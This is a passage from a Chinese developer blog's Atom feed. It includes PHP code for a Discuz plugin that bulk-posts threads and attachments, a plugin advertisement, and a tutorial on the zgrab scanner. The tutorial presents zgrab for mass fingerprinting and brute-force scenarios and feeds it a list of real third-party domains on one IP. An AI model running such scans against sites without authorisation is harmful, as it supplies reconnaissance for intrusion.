    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>对于很多用discuz做资源下载站来说,一个个上传附件,发帖是很繁琐的过程。如果需要批量上传附件发帖,就需要去模拟discuz 上传附件的流程。<br>插件地址<a href="http://addon.discuz.com/?@uauc_auto_thread.plugin" title=" http://addon.discuz.com/?@uauc_auto_thread.plugin" target="_blank" rel="noopener"> http://addon.discuz.com/?@uauc_auto_thread.plugin</a></p><h3 id="模拟上传"><a href="#模拟上传" class="headerlink" title="模拟上传"></a>模拟上传</h3><h4 id="discuz-附件逻辑"><a href="#discuz-附件逻辑" class="headerlink" title="discuz 附件逻辑"></a>discuz 附件逻辑</h4><p>dz附件储存在一个附件索引表pre_forum_attachment 和一系列分表pre_forum_attachment_0-9 里面,具体是哪个分表工具帖子tid而定。<br>参考discuz 内部实现可以精简为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$tableid=substr($tid, <span class="number">-1</span>);   <span class="comment">//tableid 为附件分表数字 帖子id</span></span><br></pre></td></tr></table></figure><a id="more"></a><h4 id="附件模拟上传函数"><a href="#附件模拟上传函数" class="headerlink" title="附件模拟上传函数"></a>附件模拟上传函数</h4><p>根据以上分析,封装为一个单独的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*<span class="doctag">@desc</span>     添加附件函数,具体操作是模拟discuz正常上传附件功能,返回一个附件id</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span>    $file  服务器上面的文件路径</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span>    $tid   帖子id</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span>    $pid   post_id</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span>    $dirs  文件夹</span></span><br><span class="line"><span class="comment">*<span class="doctag">@param</span>    $attachment_score   积分</span></span><br><span class="line"><span class="comment">*<span class="doctag">@return</span>   返回附件id</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add_attachment</span><span class="params">($file,$tid,$pid,$dirs,$attachment_score)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">$file_path=$dirs.<span class="string">'\\'</span>.$file;</span><br><span class="line"><span class="comment">//后缀</span></span><br><span class="line">$attachment=<span class="string">'/'</span>.md5(rand_str()).<span class="string">".attach"</span>;</span><br><span class="line">$new_file_path=<span class="string">'./data/attachment/forum'</span>.$attachment;</span><br><span class="line">$uid=<span class="number">1</span>; <span class="comment">//暂时设置为管理员</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(copy($file_path,$new_file_path))&#123;</span><br><span class="line"></span><br><span class="line">$tableid=substr($tid, <span class="number">-1</span>); <span class="comment">// 分表处理逻辑</span></span><br><span class="line"></span><br><span class="line">$attach=<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'tid'</span> =&gt; $tid ,</span><br><span class="line"><span class="string">'pid'</span> =&gt; $pid,</span><br><span class="line"><span class="string">'uid'</span> =&gt; $uid,</span><br><span class="line"><span class="string">'tableid'</span> =&gt; $tableid,  </span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$aid=DB::insert(<span class="string">'forum_attachment'</span>,$attach,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($attachment_score==<span class="number">0</span>)&#123;</span><br><span class="line">$attachment_info=<span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">'aid'</span>        =&gt; $aid,</span><br><span class="line"><span class="string">'uid'</span>        =&gt; $uid,  <span class="comment">//发布者id</span></span><br><span class="line"><span class="string">'tid'</span>        =&gt; $tid,</span><br><span class="line"><span class="string">'pid'</span>        =&gt; $pid,</span><br><span class="line"><span class="string">'dateline'</span>   =&gt; time(),</span><br><span class="line"><span class="string">'filename'</span>   =&gt; $file,  <span class="comment">//文件名称</span></span><br><span class="line"><span class="string">'filesize'</span>   =&gt; filesize($new_file_path),</span><br><span class="line"><span class="string">'attachment'</span> =&gt; $attachment ,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$attachment_info=<span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">    <span class="string">'aid'</span>        =&gt; $aid,</span><br><span class="line"><span class="string">'uid'</span>        =&gt; $uid,  <span class="comment">//发布者id</span></span><br><span class="line"><span class="string">'tid'</span>        =&gt; $tid,</span><br><span class="line"><span class="string">'pid'</span>        =&gt; $pid,</span><br><span class="line"><span class="string">'dateline'</span>   =&gt; time(),</span><br><span class="line"><span class="string">'filename'</span>   =&gt; $file,  <span class="comment">//文件名称</span></span><br><span class="line"><span class="string">'filesize'</span>   =&gt; filesize($new_file_path),</span><br><span class="line"><span class="string">'attachment'</span> =&gt; $attachment ,</span><br><span class="line">    <span class="string">'price'</span> =&gt; $attachment_score ,<span class="comment">//附件积分</span></span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DB::insert(<span class="string">'forum_attachment_'</span>.$tableid,$attachment_info,<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">return</span>  $aid;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="批量发帖"><a href="#批量发帖" class="headerlink" title="批量发帖"></a>批量发帖</h3><p>实现模拟批量上传附件之后,再来模拟批量发帖。代码参考discuz 内核实现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$discuz_uid = <span class="number">1</span>;  <span class="comment">// uid</span></span><br><span class="line">$discuz_user = <span class="string">'admin'</span>; <span class="comment">//用户名</span></span><br><span class="line">$fid = intval($_POST[<span class="string">'fid'</span>]); <span class="comment">//版块id</span></span><br><span class="line">$typeid = <span class="number">0</span>;</span><br><span class="line">$subject = substr(strrchr($dirs, <span class="string">'\\'</span>),<span class="number">1</span>);   <span class="comment">// 帖子标题</span></span><br><span class="line">$message = $text_content.$word_content.$imgpng_content.$imgjpg_content;   <span class="comment">//</span></span><br><span class="line">$timestamp = $_G[<span class="string">'timestamp'</span>];</span><br><span class="line">$onlineip = $_G[<span class="string">'clientip'</span>];</span><br><span class="line">$ismobile = <span class="number">4</span>; <span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($arr_attachment_file==<span class="keyword">NULL</span>)&#123;</span><br><span class="line">$newthread = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'fid'</span> =&gt; $fid,</span><br><span class="line"><span class="string">'posttableid'</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="string">'typeid'</span> =&gt; $typeid,</span><br><span class="line"><span class="string">'readperm'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line"><span class="string">'price'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line"><span class="string">'author'</span> =&gt; $discuz_user,</span><br><span class="line"><span class="string">'authorid'</span> =&gt; $discuz_uid,</span><br><span class="line"><span class="string">'subject'</span> =&gt; $subject,</span><br><span class="line"><span class="string">'dateline'</span> =&gt; $timestamp,</span><br><span class="line"><span class="string">'lastpost'</span> =&gt; $timestamp,</span><br><span class="line"><span class="string">'lastposter'</span> =&gt; $discuz_user</span><br><span class="line">);</span><br><span class="line">$tid = C::t(<span class="string">'forum_thread'</span>)-&gt;insert($newthread, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$subject = addslashes($subject);</span><br><span class="line">$message = addslashes($message);</span><br><span class="line">$pid = insertpost(<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'fid'</span> =&gt; $fid,</span><br><span class="line"><span class="string">'tid'</span> =&gt; $tid,</span><br><span class="line"><span class="string">'first'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'author'</span> =&gt; $discuz_user,</span><br><span class="line"><span class="string">'authorid'</span> =&gt; $discuz_uid,</span><br><span class="line"><span class="string">'subject'</span> =&gt; $subject,</span><br><span class="line"><span class="string">'dateline'</span> =&gt; $timestamp,</span><br><span class="line"><span class="string">'message'</span> =&gt; $message,</span><br><span class="line"><span class="string">'useip'</span> =&gt; $_G[<span class="string">'clientip'</span>]</span><br><span class="line">));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$newthread = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'fid'</span> =&gt; $fid,</span><br><span class="line"><span class="string">'posttableid'</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="string">'typeid'</span> =&gt; $typeid,</span><br><span class="line"><span class="string">'readperm'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line"><span class="string">'price'</span> =&gt; <span class="string">'0'</span>,</span><br><span class="line"><span class="string">'author'</span> =&gt; $discuz_user,</span><br><span class="line"><span class="string">'authorid'</span> =&gt; $discuz_uid,</span><br><span class="line"><span class="string">'subject'</span> =&gt; $subject,</span><br><span class="line"><span class="string">'dateline'</span> =&gt; $timestamp,</span><br><span class="line"><span class="string">'lastpost'</span> =&gt; $timestamp,</span><br><span class="line"><span class="string">'attachment'</span>=&gt;<span class="string">'1'</span>,</span><br><span class="line"><span class="string">'lastposter'</span> =&gt; $discuz_user</span><br><span class="line">);</span><br><span class="line">$tid = C::t(<span class="string">'forum_thread'</span>)-&gt;insert($newthread, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">$subject = addslashes($subject);</span><br><span class="line">$message = addslashes($message);</span><br><span class="line">$pid = insertpost(<span class="keyword">array</span>(</span><br><span class="line"><span class="string">'fid'</span> =&gt; $fid,</span><br><span class="line"><span class="string">'tid'</span> =&gt; $tid,</span><br><span class="line"><span class="string">'first'</span> =&gt; <span class="string">'1'</span>,</span><br><span class="line"><span class="string">'author'</span> =&gt; $discuz_user,</span><br><span class="line"><span class="string">'authorid'</span> =&gt; $discuz_uid,</span><br><span class="line"><span class="string">'subject'</span> =&gt; $subject,</span><br><span class="line"><span class="string">'dateline'</span> =&gt; $timestamp,</span><br><span class="line"><span class="string">'message'</span> =&gt; $message,</span><br><span class="line"><span class="string">'attachment'</span>=&gt;<span class="string">'1'</span>,</span><br><span class="line"><span class="string">'useip'</span> =&gt; $_G[<span class="string">'clientip'</span>]</span><br><span class="line">));</span><br><span class="line"><span class="keyword">foreach</span>($arr_attachment_file   <span class="keyword">as</span>   $keyes=&gt; $values )&#123;</span><br><span class="line"><span class="keyword">foreach</span>($values <span class="keyword">as</span> $file)&#123;</span><br><span class="line">        <span class="comment">//批量添加附件</span></span><br><span class="line">add_attachment($file,$tid,$pid,$dirs,$attachment_score);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">DB::query(<span class="string">"UPDATE pre_forum_forum SET lastpost='$timestamp', threads=threads+1, posts=posts+1, todayposts=todayposts+1 WHERE fid='$fid'"</span>, <span class="string">'UNBUFFERED'</span>);</span><br><span class="line">DB::query(<span class="string">"UPDATE pre_common_member_count SET threads=threads+1 WHERE uid='$discuz_uid'"</span>, <span class="string">'UNBUFFERED'</span>);</span><br><span class="line">DB::query(<span class="string">"UPDATE pre_common_member_status SET lastpost='$timestamp' WHERE uid='$discuz_uid'"</span>, <span class="string">'UNBUFFERED'</span>);</span><br></pre></td></tr></table></figure><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>茫茫多的文件夹<br><a href="/uploads/2016/03/auto-post-1.png"><img src="/uploads/2016/03/auto-post-1-300x128.png" alt="" title="auto-post-1"></a></p><p>批量发帖之后的列表<br><a href="/uploads/2016/03/auto_thread1.png"><img src="/uploads/2016/03/auto_thread1-300x159.png" alt="" title="auto_thread"></a></p><p>批量上传附件之后的帖子<a href="/uploads/2016/03/auto-post-2.png"><img src="/uploads/2016/03/auto-post-2-300x174.png" alt="" title="auto-post-2"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;对于很多用discuz做资源下载站来说,一个个上传附件,发帖是很繁琐的过程。如果需要批量上传附件发帖,就需要去模拟discuz 上传附件的流程。&lt;br&gt;插件地址&lt;a href=&quot;http://addon.discuz.com/?@uauc_auto_thread.plugin&quot; title=&quot; http://addon.discuz.com/?@uauc_auto_thread.plugin&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt; http://addon.discuz.com/?@uauc_auto_thread.plugin&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;模拟上传&quot;&gt;&lt;a href=&quot;#模拟上传&quot; class=&quot;headerlink&quot; title=&quot;模拟上传&quot;&gt;&lt;/a&gt;模拟上传&lt;/h3&gt;&lt;h4 id=&quot;discuz-附件逻辑&quot;&gt;&lt;a href=&quot;#discuz-附件逻辑&quot; class=&quot;headerlink&quot; title=&quot;discuz 附件逻辑&quot;&gt;&lt;/a&gt;discuz 附件逻辑&lt;/h4&gt;&lt;p&gt;dz附件储存在一个附件索引表pre_forum_attachment 和一系列分表pre_forum_attachment_0-9 里面,具体是哪个分表工具帖子tid而定。&lt;br&gt;参考discuz 内部实现可以精简为&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$tableid=substr($tid, &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);   &lt;span class=&quot;comment&quot;&gt;//tableid 为附件分表数字 帖子id&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="discuz" scheme="http://yaseng.org/categories/discuz/"/>
    
      <category term="西部大开发" scheme="http://yaseng.org/categories/discuz/%E8%A5%BF%E9%83%A8%E5%A4%A7%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="discuz 插件" scheme="http://yaseng.org/tags/discuz-%E6%8F%92%E4%BB%B6/"/>
    
      <category term="discuz" scheme="http://yaseng.org/tags/discuz/"/>
    
  </entry>
  
  <entry>
    <title>discuz 后台批量上传发帖插件 1.0</title>
    <link href="http://yaseng.org/discuz-uauc-auto-thread-1-0.html"/>
    <id>http://yaseng.org/discuz-uauc-auto-thread-1-0.html</id>
    <published>2016-03-29T00:19:01.000Z</published>
    <updated>2016-09-01T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="插件介绍"><a href="#插件介绍" class="headerlink" title="插件介绍"></a>插件介绍</h3><p>自动发帖插件可以读取服务器上的文件夹和文件进行批量发帖，通过插件设置，可以读取不同类型的文件，并能够把指定的文件，设置为帖子附件或帖子内容。适用于资源站等类型。</p><p><strong>插件地址</strong> <a href="http://addon.discuz.com/?@uauc_auto_thread.plugin" title="http://addon.discuz.com/?@uauc_auto_thread.plugin" target="_blank" rel="noopener"><strong>http://addon.discuz.com/?@uauc_auto_thread.plugin</strong></a><br><a id="more"></a></p><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><p>使用前，请先在站点全局设置里，把网站地址设置为当前论坛的网址，文件夹请先通过ftp等工具上传至站点服务器上，并设置为多级目录结构，程序将会读取该目录下的文件夹，并以文件夹标题作为帖子标题，该目录下的每一个文件夹对应生成一个帖子，请确保该目录下存在多个文件夹，以便程序读取！word文档读取作为帖子内容，必须在服务器上安装offcie2007，并配置com组件，如有扩展需求或插件使用问题，请联系客服 。</p><h3 id="插件功能"><a href="#插件功能" class="headerlink" title="插件功能"></a>插件功能</h3><p>1:支持自定义文件数量和路径<br>2：支持附件上传和积分设置<br>3：支持文件夹读取和批量发帖</p><h3 id="插件演示"><a href="#插件演示" class="headerlink" title="插件演示"></a>插件演示</h3><p><a href="/uploads/2016/03/auto_thread2.png"><img src="/uploads/2016/03/auto_thread2-300x127.png" alt="" title="auto_thread2"></a></p><p><a href="/uploads/2016/03/auto_thread.png"><img src="/uploads/2016/03/auto_thread-300x159.png" alt="" title="auto_thread"></a></p><h3 id="UaUc技术支持"><a href="#UaUc技术支持" class="headerlink" title="UaUc技术支持"></a>UaUc技术支持</h3><p>UaUcNet专业服务于广大discuz站长，提供插件私人定制，二次开发，模板定制，论坛疑难问题解答，搬家升级等服务！以专业成熟的技术水平，认真负责的工作态度，为您的论坛运营提供最贴心的技术服务！ 详情请联系UaUCNet团队客服 QQ：189333720  。<br><a href="tencent://message/?uin=189333720&amp;Site=http://www.uauc.net&amp;Menu=yes" target="_blank" rel="noopener"><img src="http://wpa.qq.com/pa?p=2:189333720:42" alt="QQ" title="QQ"></a> </p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;插件介绍&quot;&gt;&lt;a href=&quot;#插件介绍&quot; class=&quot;headerlink&quot; title=&quot;插件介绍&quot;&gt;&lt;/a&gt;插件介绍&lt;/h3&gt;&lt;p&gt;自动发帖插件可以读取服务器上的文件夹和文件进行批量发帖，通过插件设置，可以读取不同类型的文件，并能够把指定的文件，设置为帖子附件或帖子内容。适用于资源站等类型。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;插件地址&lt;/strong&gt; &lt;a href=&quot;http://addon.discuz.com/?@uauc_auto_thread.plugin&quot; title=&quot;http://addon.discuz.com/?@uauc_auto_thread.plugin&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;&lt;strong&gt;http://addon.discuz.com/?@uauc_auto_thread.plugin&lt;/strong&gt;&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="原创作品" scheme="http://yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
    
    
      <category term="discuz 插件" scheme="http://yaseng.org/tags/discuz-%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>Hello Github</title>
    <link href="http://yaseng.org/hello-github.html"/>
    <id>http://yaseng.org/hello-github.html</id>
    <published>2016-03-17T06:30:42.000Z</published>
    <updated>2016-04-17T10:51:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>Hello Github</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Hello Github&lt;/p&gt;

      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于zmap 的应用层扫描器 zgrab (一)</title>
    <link href="http://yaseng.org/application-layer-scanner-with-zmap-zgrab-1.html"/>
    <id>http://yaseng.org/application-layer-scanner-with-zmap-zgrab-1.html</id>
    <published>2015-12-27T10:18:30.000Z</published>
    <updated>2016-09-01T13:27:52.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>zgrab 是基于zmap无状态扫描的应用层扫描器,可以自定义数据包,以及ip,domain之间的关联。可用于快速指纹识别爆破等场景。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>首先需要安装go lang 环境<br>然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/zmap/zgrab</span><br><span class="line">cd $GOPATH/src/github.com/zmap/zgrab</span><br><span class="line">go build</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>zgrab -help<br>参数    注释    示范<br>port    端口    –port 80<br>data    发送数据包并且返回响应    –data http-req-domain<br><a id="more"></a></p><h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><h5 id="zmap-扫描结果"><a href="#zmap-扫描结果" class="headerlink" title="zmap 扫描结果"></a>zmap 扫描结果</h5><p>输入流可以使用zmap 的扫描结果,例如项目主页的例子<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmap -p 443 --output-fields=* | ztee results.csv | zgrab --port 443 --tls --data=./http-req --output-file=banners.json</span><br></pre></td></tr></table></figure></p><p>其中 http-req 为自定义的数据包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@pw_node_1 zgrab]# cat  http-req</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: %s</span><br></pre></td></tr></table></figure></p><h5 id="域名列表"><a href="#域名列表" class="headerlink" title="域名列表"></a>域名列表</h5><p>ip,domain  的文件,例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@pw_node_1 zgrab]# cat  2.csv</span><br><span class="line">36.51.255.148,tinyjun.com</span><br><span class="line">36.51.255.148,i6618.com</span><br><span class="line">36.51.255.148,www.linwen.com</span><br><span class="line">36.51.255.148,lujunda.cn</span><br><span class="line">36.51.255.148,haohaomai.com</span><br><span class="line">36.51.255.148,it1208.com</span><br><span class="line">36.51.255.148,www.lijinmao.com</span><br><span class="line">36.51.255.148,lushao.cn</span><br><span class="line">36.51.255.148,i6618.com</span><br><span class="line">36.51.255.148,www.it-case.com</span><br><span class="line">36.51.255.148,zhihub.com</span><br><span class="line">36.51.255.148,wwww.yaseng.org</span><br></pre></td></tr></table></figure></p><p>cat 2.csv  |   ./zgrab  –port  80  –data  http-req-domain</p><h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><p>默认输出为json ,可以使用jq 工具解析</p><h4 id="示范"><a href="#示范" class="headerlink" title="示范"></a>示范</h4><p>扫描 127.0.0.1,localhost<br>效果如图<br><a href="/uploads/2015/12/zgrab_1_1.jpg"><img src="/uploads/2015/12/zgrab_1_1-300x135.jpg" alt="" title="zgrab_1_1"></a></p><p>命令行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@pw_node_1 zgrab]# cat  3.csv</span><br><span class="line">127.0.0.1,localhost</span><br><span class="line">[root@pw_node_1 zgrab]# cat  /tmp/3.csv  |   ./zgrab  --port  80  --data  http-req-domain  |  jq  &quot;.&quot;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;data&quot;: &#123;</span><br><span class="line">    &quot;write&quot;: &quot;GET / HTTP/1.1\r\nHost: localhost\r\n\r\n&quot;,</span><br><span class="line">    &quot;read&quot;: &quot;HTTP/1.1 200 OK\r\nDate: Sun, 27 Dec 2015 17:33:43 GMT\r\nServer: Apache/2.2.15 (CentOS)\r\nLast-Modified: Fri, 11 Dec 2015 14:51:21 GMT\r\nETag: \&quot;82db1-e-526a074ea5571\&quot;\r\nAccept-Ranges: bytes\r\nContent-Length: 14\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\nhello  yaseng\n&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;timestamp&quot;: &quot;2015-12-28T01:33:43+08:00&quot;,</span><br><span class="line">  &quot;domain&quot;: &quot;localhost&quot;,</span><br><span class="line">  &quot;ip&quot;: &quot;127.0.0.1&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sni_support&quot;: true,</span><br><span class="line">  &quot;ca_file_name&quot;: null,</span><br><span class="line">  &quot;mail_type&quot;: null,</span><br><span class="line">  &quot;tls_version&quot;: null,</span><br><span class="line">  &quot;timeout&quot;: 10,</span><br><span class="line">  &quot;port&quot;: 80,</span><br><span class="line">  &quot;success_count&quot;: 1,</span><br><span class="line">  &quot;failure_count&quot;: 0,</span><br><span class="line">  &quot;total&quot;: 1,</span><br><span class="line">  &quot;start_time&quot;: &quot;2015-12-28T01:33:43+08:00&quot;,</span><br><span class="line">  &quot;end_time&quot;: &quot;2015-12-28T01:33:43+08:00&quot;,</span><br><span class="line">  &quot;duration&quot;: 0,</span><br><span class="line">  &quot;senders&quot;: 1000</span><br><span class="line">&#125;</span><br><span class="line">[root@pw_node_1 zgrab]# curl  localhost</span><br><span class="line">hello  yaseng</span><br><span class="line">[root@pw_node_1 zgrab]#</span><br></pre></td></tr></table></figure></p><h4 id="自定义数据包"><a href="#自定义数据包" class="headerlink" title="自定义数据包"></a>自定义数据包</h4><p>可以自定义http 数据包,例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@pw_node_1 zgrab]# cat   http-req-domain</span><br><span class="line">GET /1.php HTTP/1.1</span><br><span class="line">Host: %d</span><br></pre></td></tr></table></figure></p><h3 id="实例-快速指纹识别"><a href="#实例-快速指纹识别" class="headerlink" title="实例:快速指纹识别"></a>实例:快速指纹识别</h3><p>例如需要在一大批域名列表里面快速识别wordpress,并且输出域名。<br>首先从header 里面找出wp 的指纹以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 